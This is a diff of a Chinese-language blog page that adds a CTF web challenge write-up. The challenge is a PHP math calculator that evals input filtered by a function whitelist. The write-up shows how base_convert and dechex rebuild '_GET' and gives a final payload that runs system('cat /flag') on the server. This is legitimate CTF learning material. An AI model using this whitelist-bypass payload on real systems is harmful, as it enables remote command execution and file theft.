@@ -64,7 +64,9 @@
 <meta property="og:description" content="Web学习">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://i.loli.net/2020/02/03/loFPzHSr5ywiLR3.png">
-<meta property="og:updated_time" content="2020-02-03T10:03:37.929Z">
+<meta property="og:image" content="https://i.loli.net/2020/02/03/Dymcde8qjJTriKf.png">
+<meta property="og:image" content="https://i.loli.net/2020/02/03/5RLthpyNgnzrPcT.png">
+<meta property="og:updated_time" content="2020-02-03T15:36:23.419Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WEB">
 <meta name="twitter:description" content="Web学习">
@@ -250,7 +252,7 @@
                 
               
 
-              <time title="创建时间：2020-02-03 16:48:09 / 修改时间：18:03:37" itemprop="dateCreated datePublished" datetime="2020-02-03T16:48:09+08:00">2020-02-03</time>
+              <time title="创建时间：2020-02-03 16:48:09 / 修改时间：23:36:23" itemprop="dateCreated datePublished" datetime="2020-02-03T16:48:09+08:00">2020-02-03</time>
             </span>
           
             
@@ -348,6 +350,33 @@
 </ul>
 </li>
 </ul>
+<p>首先分析题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>首先判断c是否在参数内,且长度要小于80字节.还限制了一堆符号,判断参数字符是否都在白名单内,都满足,就执行.</li>
+<li>查看下给的数学函数,发现一个有趣的<br><img src="https://i.loli.net/2020/02/03/Dymcde8qjJTriKf.png" alt="image.png"><br>可以任意进制转换,于是就可以通过它来构造payload参数</li>
+</ol>
+<p>3.通过一些进制转换<br>记下小笔记:</p>
+<p><a href="http://www.atool9.com/hexconvert.php" target="_blank" rel="noopener">任意进制转换</a></p>
+<p><a href="https://www.duplichecker.com/hex-to-text.php" target="_blank" rel="noopener">hex to text</a> </p>
+<p>想办法构造出_GET再用函数传参</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//_GET =&gt; 5f474554</span></span><br><span class="line">$hex = hex2bin(<span class="string">"5f474554"</span>);</span><br><span class="line"></span><br><span class="line">var_dump($hex);</span><br><span class="line"><span class="comment">//base_convert(37907361743,10,36) =&gt; hex2bin</span></span><br><span class="line"><span class="comment">//dechex(1598506324)十进制转十六进制 =&gt; 5f474554</span></span><br><span class="line">$string = base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));</span><br><span class="line"><span class="comment">//层层递进</span></span><br><span class="line">var_dump($string);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">E:\wampp\www\5.php:4:string '_GET' (length=4)</span></span><br><span class="line"><span class="comment">E:\wampp\www\5.php:8:string '_GET' (length=4)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>最后即构造出payload</li>
+</ol>
+<blockquote>
+<p>/?abs=cat /flag&amp;pow=system&amp;c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pow}($$pi{abs})</p>
+</blockquote>
+<ol start="5">
+<li>相当于执行命令system(cat /flag)</li>
+</ol>
+<p>$$pi{pow} =&gt; _GET{pow}</p>
+<p>后者一样.</p>
+<ol start="6">
+<li>最后发包得到flag<br><img src="https://i.loli.net/2020/02/03/5RLthpyNgnzrPcT.png" alt="image.png"></li>
+</ol>
 
     </div>
 
@@ -393,8 +422,8 @@
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
               
-                <a href="/2019/12/14/b/" rel="next" title="">
-                  <i class="fa fa-chevron-left"></i> 
+                <a href="/2019/10/30/h/" rel="next" title="HOST文件">
+                  <i class="fa fa-chevron-left"></i> HOST文件
                 </a>
               
             </div>
@@ -468,7 +497,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-count">8</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
